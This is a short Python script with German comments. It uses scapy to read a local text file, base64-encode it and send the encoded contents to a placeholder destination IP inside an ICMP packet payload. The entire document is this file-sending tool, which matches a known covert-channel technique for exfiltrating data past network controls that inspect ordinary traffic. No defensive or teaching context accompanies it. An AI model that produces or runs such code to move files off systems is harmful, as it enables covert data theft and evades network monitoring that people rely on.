import base64
import os
from scapy.all import *

# 1. Auslesen der Textdatei
def read_file(file_path):
    with open(file_path, 'r') as file:
        data = file.read()
    return data

# 2. Codierung des Textinhaltes mit Base64
def encode_data(data):
    encoded_data = base64.b64encode(data.encode())
    return encoded_data

# 3. Senden der codierten Daten über den Netzwerkstack mit ICMP
def send_data(encoded_data, destination_ip):
    packet = IP(dst=destination_ip)/ICMP()/encoded_data
    send(packet)

# Hauptfunktion
def main():
    file_path = 'path_to_your_file'  # Pfad zur Textdatei
    destination_ip = 'destination_ip'  # Ziel-IP-Adresse

    data = read_file(file_path)
    encoded_data = encode_data(data)
    send_data(encoded_data, destination_ip)

if __name__ == "__main__":
    main()